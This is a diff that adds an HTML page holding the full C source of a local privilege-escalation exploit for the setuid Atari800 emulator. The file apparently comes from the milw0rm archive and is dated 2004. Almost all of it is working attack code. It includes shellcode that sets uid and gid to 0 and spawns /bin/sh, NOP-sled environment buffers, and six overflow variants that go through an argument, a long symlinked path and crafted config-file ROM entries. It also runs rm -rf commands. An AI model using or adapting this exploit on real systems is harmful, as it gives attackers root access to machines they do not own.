@@ -1,0 +1,376 @@
+<html><head><title>atari800 Local Root Exploit</title></head><pre>/*
+* Exploit for atari800 by pi3 (pi3ki31ny)
+*
+* pi3@pi3:~$ ./p
+*
+*         ...::: -=[ exploit for Atari800 by pi3 (pi3ki31ny) ]=- :::...
+*
+*         Ussage:
+*         [+] ./p [options]
+*
+*             -? &lt;this help screen&gt;
+*             -v choose a bug:
+*                    1 - first bug    (in all versions Atari800)
+*                    2 - second bug   (in older Atari800 - modiy argv[0])
+*                    3 - third bug    (in config file - OS/A_ROM)
+*                    4 - fourth bug   (in config file - OS/B_ROM)
+*                    5 - fifth bug    (in config file - XL/XE_ROM)
+*                    6 - sixth bug    (in config file - BASIC_ROM)
+*             -o &lt;offset&gt;
+*             -p PATH
+*
+* pi3@pi3:~$
+*
+* Atari800 have suid bit in default instalation.
+* Best regards pi3 (pi3ki31ny).
+*
+* &quot;Kazdemu trafi sie gowno...!&quot;
+*
+* Greetz: [greetz on my web] &amp;&amp; other my friends (you know who you are)
+*
+*         ...::: -=[ www.pi3.int.pl ]=- :::...
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;getopt.h&gt;
+#include &lt;assert.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;fcntl.h&gt;
+
+#define PATH &quot;/usr/local/bin/atari800&quot;
+#define DIRS 256
+#define CONFIG &quot;.atari800.cfg&quot;
+
+/*    ...::: -=[ www.pi3.int.pl ]=- :::...    */
+
+char shellcode[] = &quot;\x31\xdb\x31\xc0\x31\xd2\xb2\x2d\x6a\x0a\x68\x3a&quot;
+                  &quot;\x2e\x2e\x2e\x68\x2d\x20\x3a\x3a\x68\x6c\x20\x5d&quot;
+                  &quot;\x3d\x68\x6e\x74\x2e\x70\x68\x69\x33\x2e\x69\x68&quot;
+                  &quot;\x77\x77\x2e\x70\x68\x3d\x5b\x20\x77\x68\x3a\x3a&quot;
+                  &quot;\x20\x2d\x68\x2e\x2e\x2e\x3a\x89\xe1\xb0\x04\xcd&quot;
+                  &quot;\x80&quot;
+
+/*    setuid(0)    */
+
+                  &quot;\x31\xdb\x89\xd8\xb0\x17\xcd\x80&quot;
+
+/*    setgid(0)    */
+
+                  &quot;\x31\xdb\x89\xd8\xb0\x2e\xcd\x80&quot;
+
+/*    exec /bin/sh    */
+
+                  &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69&quot;
+                  &quot;\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd&quot;
+                  &quot;\x80&quot;
+
+/*    exit(0)    */
+
+                  &quot;\x31\xdb\x89\xd8\xb0\x01\xcd\x80&quot;;
+
+long ret_ad(char *a1, char *a2) {
+
+//   return (0xbffffffa-strlen(a1)-strlen(a2));
+    return 0xbfffee01;
+}
+
+int ussage(char *arg) {
+
+  printf(&quot;\n\t...::: -=[ exploit for Atari800 by pi3 (pi3ki31ny) ]=- :::...\n&quot;);
+  printf(&quot;\n\tUssage:\n\t[+] %s [options]\n
+           -? &lt;this help screen&gt;
+           -v choose a bug:
+                  1 - first bug    (in all versions Atari800)
+                  2 - second bug   (in older Atari800 - modiy argv[0])
+                  3 - third bug    (in config file - OS/A_ROM)
+                  4 - fourth bug   (in config file - OS/B_ROM)
+                  5 - fifth bug    (in config file - XL/XE_ROM)
+                  6 - sixth bug    (in config file - BASIC_ROM)
+           -o &lt;offset&gt;
+           -p PATH\n\n&quot;,arg);
+  exit(-1);
+}
+
+int main(int argc, char *argv[]) {
+
+  long ret,*buf_addr;
+  char envp[8196],*path=PATH;
+  static char *sh[0x02];
+  char buf[DIRS],link[500],conf[5000];
+  int i,opt,op2=0,offset=0;
+  FILE *fp;
+
+  while((opt = getopt(argc,argv,&quot;p:o:v:?&quot;)) != -1) {
+        switch(opt) {
+
+         case 'o':
+
+           offset=atoi(optarg);
+           break;
+
+         case 'p':
+
+           path=optarg;
+           break;
+
+         case 'v':
+
+           op2=atoi(optarg);
+           break;
+
+         case '?':
+         default:
+
+           ussage(argv[0]);
+           break;
+        }
+  }
+
+  if (op2==0)
+    ussage(argv[0]);
+
+  if ( (fp=fopen(path,&quot;r&quot;))==NULL) {
+     printf(&quot;\n*\tI can\'t open path to victim! - %s\t*\n\n&quot;,path);
+     ussage(argv[0]);
+  } fclose(fp);
+
+  if ( (fp=fopen(CONFIG,&quot;r&quot;))==NULL) {
+     if ( (fp=fopen(CONFIG,&quot;w&quot;))==NULL) {
+        printf(&quot;I can\'t create config file!\n&quot;);
+        exit(-1);
+     }
+     printf(&quot;\nCreating config file...\n\n\n&quot;);
+     fprintf(fp,&quot;Atari 800 Emulator, Version 1.3.0\n&quot;);
+     fprintf(fp,&quot;OS/A_ROM=atariosa.rom\n&quot;);
+     fprintf(fp,&quot;OS/B_ROM=atariosb.rom\n&quot;);
+     fprintf(fp,&quot;XL/XE_ROM=atarixl.rom\n&quot;);
+     fprintf(fp,&quot;BASIC_ROM=ataribas.rom\n&quot;);
+     fprintf(fp,&quot;5200_ROM=\n&quot;);
+     fprintf(fp,&quot;DISK_DIR=.\n&quot;);
+     fprintf(fp,&quot;ROM_DIR=.\n&quot;);
+     fprintf(fp,&quot;H1_DIR=\n&quot;);
+     fprintf(fp,&quot;H2_DIR=\n&quot;);
+     fprintf(fp,&quot;H3_DIR=\n&quot;);
+     fprintf(fp,&quot;H4_DIR=\n&quot;);
+     fprintf(fp,&quot;HD_READ_ONLY=1\n&quot;);
+     fprintf(fp,&quot;EXE_DIR=\n&quot;);
+     fprintf(fp,&quot;STATE_DIR=\n&quot;);
+     fprintf(fp,&quot;PRINT_COMMAND=lpr %s\n&quot;);
+     fprintf(fp,&quot;SCREEN_REFRESH_RATIO=1\n&quot;);
+     fprintf(fp,&quot;MACHINE_TYPE=Atari XL/XE\n&quot;);
+     fprintf(fp,&quot;RAM_SIZE=64\n&quot;);
+     fprintf(fp,&quot;DEFAULT_TV_MODE=PAL\n&quot;);
+     fprintf(fp,&quot;DISABLE_BASIC=1\n&quot;);
+     fprintf(fp,&quot;ENABLE_SIO_PATCH=1\n&quot;);
+     fprintf(fp,&quot;ENABLE_H_PATCH=1\n&quot;);
+     fprintf(fp,&quot;ENABLE_P_PATCH=1\n&quot;);
+     fprintf(fp,&quot;ENABLE_NEW_POKEY=1\n&quot;);
+     fprintf(fp,&quot;STEREO_POKEY=0\n&quot;);
+  } fclose(fp);
+
+  if (op2==1) {
+
+     printf(&quot;\n\t...::: -=[ exploit for Atari800 by pi3 (pi3ki31ny) ]=- :::...\n&quot;);
+     printf(&quot;\n\t[+] Bulding buffors!\n&quot;);
+
+     ret=ret_ad(shellcode,path);
+     ret+=offset;
+
+     printf(&quot;\t[+] Using adres 0x%x\n&quot;,ret);
+     printf(&quot;\t[+] Using first bug in Atari800\n&quot;);
+
+     memset(envp,0x90,sizeof(envp));
+     for (i=0; i&lt;strlen(shellcode); i++)
+       envp[8196-strlen(shellcode)+i] = shellcode[i];
+     sh[0x00]=envp;
+     sh[0x01]=NULL;
+
+     strcpy(link,&quot;AA&quot;);
+     buf_addr=(long*)&amp;link[2];
+     for(i=0;i&lt;500;i+=4)
+       *(buf_addr)++ = ret;
+
+     link[499]='\0';
+     printf(&quot;\nExecuting the vuln program - %s\n\n&quot;,PATH);
+     execle(PATH,PATH,link,0,sh);
+     printf(&quot;Kazdemu trafi sie gowno...!\n&quot;);
+     return 0;
+  } else if (op2==2) {
+
+     system(&quot;rm -rf `perl -e 'print \&quot;\\x41\&quot;x250'`; rm -f 1&quot;);
+
+     printf(&quot;\n\t...::: -=[ exploit for Atari800 by pi3 (pi3ki31ny) ]=- :::...\n&quot;);
+     printf(&quot;\n\t[+] Bulding buffors!\n&quot;);
+
+     ret=ret_ad(shellcode,path);
+     ret+=offset;
+
+     printf(&quot;\t[+] Using adres 0x%x\n&quot;,ret);
+     printf(&quot;\t[+] Using second bug in Atari800\n&quot;);
+
+     memset(envp,0x90,sizeof(envp));
+     for (i=0; i&lt;strlen(shellcode); i++)
+       envp[8196-strlen(shellcode)+i] = shellcode[i];
+     sh[0x00]=envp;
+     sh[0x01]=NULL;
+
+     memset(buf,0x41,(size_t)250);
+     strcpy(link,&quot;./&quot;);
+     memset(&amp;link[2],0x41,(size_t)252);
+     assert(mkdir(buf, 0755) != -1);
+     assert(chdir(buf) != -1);
+
+     buf_addr=(long*)buf;
+     for (i=0; i&lt;80; i+=4)
+       *(buf_addr)++ = ret;
+     buf[80]='\0';
+     //   snprintf(link+252,500,&quot;/`perl -e \'print \&quot;\\x01\\xee\\xff\\xbf\&quot;x20\'` pi3&quot;);
+     snprintf(link+252,500,&quot;/%s&quot;,buf);
+     assert(symlink(path, buf) != -1);
+     assert(chdir(&quot;../&quot;) != -1);
+
+     printf(&quot;\nExecuting the vuln program - %s\n\n&quot;,link);
+     // system(link);
+     execle(link,link,&quot;pi3&quot;,0,sh);
+     printf(&quot;Kazdemu trafi sie gowno...!\n&quot;);
+     return 0;
+  } else if (op2==3) {
+
+     printf(&quot;\n\t...::: -=[ exploit for Atari800 by pi3 (pi3ki31ny) ]=- :::...\n&quot;);
+     printf(&quot;\n\t[+] Bulding buffors!\n&quot;);
+
+     ret=ret_ad(shellcode,path);
+     ret+=offset;
+
+     printf(&quot;\t[+] Using adres 0x%x\n&quot;,ret);
+     printf(&quot;\t[+] Using third bug in Atari800\n&quot;);
+
+     memset(envp,0x90,sizeof(envp));
+     for (i=0; i&lt;strlen(shellcode); i++)
+       envp[8196-strlen(shellcode)+i] = shellcode[i];
+     sh[0x00]=envp;
+     sh[0x01]=NULL;
+
+     strcpy(conf,&quot;AA&quot;);
+     buf_addr=(long*)&amp;conf[2];
+     for(i=0;i&lt;5000;i+=4)
+       *(buf_addr)++ = ret;
+
+     conf[4999]='\0';
+     system(&quot;rm -rf .pi3.conf&quot;);
+     if ( (fp=fopen(&quot;.pi3.conf&quot;,&quot;w&quot;)) == NULL) {
+        printf(&quot;I can\'t create config file!\nExiting...\n&quot;);
+        exit(-1);
+     }
+     fprintf(fp,&quot;OS/A_ROM=%s\n&quot;,conf);
+     printf(&quot;\nExecuting the vuln program - %s\n\n&quot;,PATH);
+     execle(PATH,PATH,&quot;-config&quot;,&quot;.pi3.conf&quot;,0,sh);
+     printf(&quot;Kazdemu trafi sie gowno...!\n&quot;);
+     return 0;
+  } else if (op2==4) {
+
+     printf(&quot;\n\t...::: -=[ exploit for Atari800 by pi3 (pi3ki31ny) ]=- :::...\n&quot;);
+     printf(&quot;\n\t[+] Bulding buffors!\n&quot;);
+
+     ret=ret_ad(shellcode,path);
+     ret+=offset;
+
+     printf(&quot;\t[+] Using adres 0x%x\n&quot;,ret);
+     printf(&quot;\t[+] Using fourth bug in Atari800\n&quot;);
+
+     memset(envp,0x90,sizeof(envp));
+     for (i=0; i&lt;strlen(shellcode); i++)
+       envp[8196-strlen(shellcode)+i] = shellcode[i];
+     sh[0x00]=envp;
+     sh[0x01]=NULL;
+
+     strcpy(conf,&quot;AA&quot;);
+     buf_addr=(long*)&amp;conf[2];
+     for(i=0;i&lt;5000;i+=4)
+       *(buf_addr)++ = ret;
+
+     conf[4999]='\0';
+     system(&quot;rm -rf .pi3.conf&quot;);
+     if ( (fp=fopen(&quot;.pi3.conf&quot;,&quot;w&quot;)) == NULL) {
+        printf(&quot;I can\'t create config file!\nExiting...\n&quot;);
+        exit(-1);
+     }
+     fprintf(fp,&quot;OS/B_ROM=%s\n&quot;,conf);
+     printf(&quot;\nExecuting the vuln program - %s\n\n&quot;,PATH);
+     execle(PATH,PATH,&quot;-config&quot;,&quot;.pi3.conf&quot;,0,sh);
+     printf(&quot;Kazdemu trafi sie gowno...!\n&quot;);
+     return 0;
+  } else if (op2==5) {
+
+     printf(&quot;\n\t...::: -=[ exploit for Atari800 by pi3 (pi3ki31ny) ]=- :::...\n&quot;);
+     printf(&quot;\n\t[+] Bulding buffors!\n&quot;);
+
+     ret=ret_ad(shellcode,path);
+     ret+=offset;
+
+     printf(&quot;\t[+] Using adres 0x%x\n&quot;,ret);
+     printf(&quot;\t[+] Using fifth bug in Atari800\n&quot;);
+
+     memset(envp,0x90,sizeof(envp));
+     for (i=0; i&lt;strlen(shellcode); i++)
+       envp[8196-strlen(shellcode)+i] = shellcode[i];
+     sh[0x00]=envp;
+     sh[0x01]=NULL;
+
+     strcpy(conf,&quot;A&quot;);
+     buf_addr=(long*)&amp;conf[1];
+     for(i=0;i&lt;5000;i+=4)
+       *(buf_addr)++ = ret;
+
+     conf[4999]='\0';
+     system(&quot;rm -rf .pi3.conf&quot;);
+     if ( (fp=fopen(&quot;.pi3.conf&quot;,&quot;w&quot;)) == NULL) {
+        printf(&quot;I can\'t create config file!\nExiting...\n&quot;);
+        exit(-1);
+     }
+     fprintf(fp,&quot;XL/XE_ROM=%s\n&quot;,conf);
+     printf(&quot;\nExecuting the vuln program - %s\n\n&quot;,PATH);
+     execle(PATH,PATH,&quot;-config&quot;,&quot;.pi3.conf&quot;,0,sh);
+     printf(&quot;Kazdemu trafi sie gowno...!\n&quot;);
+     return 0;
+  } else if (op2==6) {
+
+     printf(&quot;\n\t...::: -=[ exploit for Atari800 by pi3 (pi3ki31ny) ]=- :::...\n&quot;);
+     printf(&quot;\n\t[+] Bulding buffors!\n&quot;);
+
+     ret=ret_ad(shellcode,path);
+     ret+=offset;
+
+     printf(&quot;\t[+] Using adres 0x%x\n&quot;,ret);
+     printf(&quot;\t[+] Using sixth bug in Atari800\n&quot;);
+
+     memset(envp,0x90,sizeof(envp));
+     for (i=0; i&lt;strlen(shellcode); i++)
+       envp[8196-strlen(shellcode)+i] = shellcode[i];
+     sh[0x00]=envp;
+     sh[0x01]=NULL;
+
+     strcpy(conf,&quot;A&quot;);
+     buf_addr=(long*)&amp;conf[1];
+     for(i=0;i&lt;5000;i+=4)
+       *(buf_addr)++ = ret;
+
+     conf[4999]='\0';
+     system(&quot;rm -rf .pi3.conf&quot;);
+     if ( (fp=fopen(&quot;.pi3.conf&quot;,&quot;w&quot;)) == NULL) {
+        printf(&quot;I can\'t create config file!\nExiting...\n&quot;);
+        exit(-1);
+     }
+     fprintf(fp,&quot;BASIC_ROM=%s\n&quot;,conf);
+     printf(&quot;\nExecuting the vuln program - %s\n\n&quot;,PATH);
+     execle(PATH,PATH,&quot;-config&quot;,&quot;.pi3.conf&quot;,0,sh);
+     printf(&quot;Kazdemu trafi sie gowno...!\n&quot;);
+     return 0;
+  }
+}
+
+// milw0rm.com [2004-11-25]</pre></html>
